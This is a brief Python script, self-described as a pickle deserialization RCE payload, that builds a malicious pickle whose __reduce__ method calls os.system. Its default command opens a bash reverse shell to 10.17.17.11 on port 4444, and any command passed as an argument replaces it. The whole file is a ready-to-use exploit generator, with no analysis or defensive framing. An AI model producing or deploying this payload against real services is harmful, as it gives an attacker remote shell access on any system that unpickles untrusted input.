#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle
import sys
import base64

DEFAULT_COMMAND = "bash -c 'bash -i >& /dev/tcp/10.17.17.11/4444 0>&1'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print (pickle.dumps(PickleRce()))

